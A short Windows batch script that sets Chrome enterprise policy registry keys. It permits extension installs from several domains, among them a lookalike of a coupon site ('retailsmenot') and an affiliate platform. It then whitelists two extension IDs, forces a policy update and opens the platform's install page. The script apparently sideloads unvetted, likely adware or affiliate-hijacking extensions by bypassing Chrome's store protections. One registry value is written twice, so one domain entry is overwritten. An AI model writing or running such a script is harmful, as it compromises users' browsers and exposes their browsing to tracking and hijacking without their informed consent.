reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "1" /t REG_SZ /d "http://www.retailsmenot.com/*" /f
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "2" /t REG_SZ /d "https://www.retailsmenot.com/*" /f
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "3" /t REG_SZ /d "https://retailsmenot.com/*" /f
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "4" /t REG_SZ /d "http://retailsmenot.com/*" /f
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "4" /t REG_SZ /d "http://danyial.com/*" /f
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "5" /t REG_SZ /d "http://rana.com/*" /f
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "6" /t REG_SZ /d "http://affiliateplatform.itworld.com.pk/*" /f
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "7" /t REG_SZ /d "https://affiliateplatform.itworld.com.pk/*" /f
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallWhitelist" /v "1" /t REG_SZ /d "necndgdfkjkkdienhhcpbelpjiaeablb" /f
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallWhitelist" /v "2" /t REG_SZ /d "jlohcjidoacacfmapficnjemchgdechn" /f
cls
gpupdate /force
start http://affiliateplatform.itworld.com.pk/extension/index.php?step=2
cls
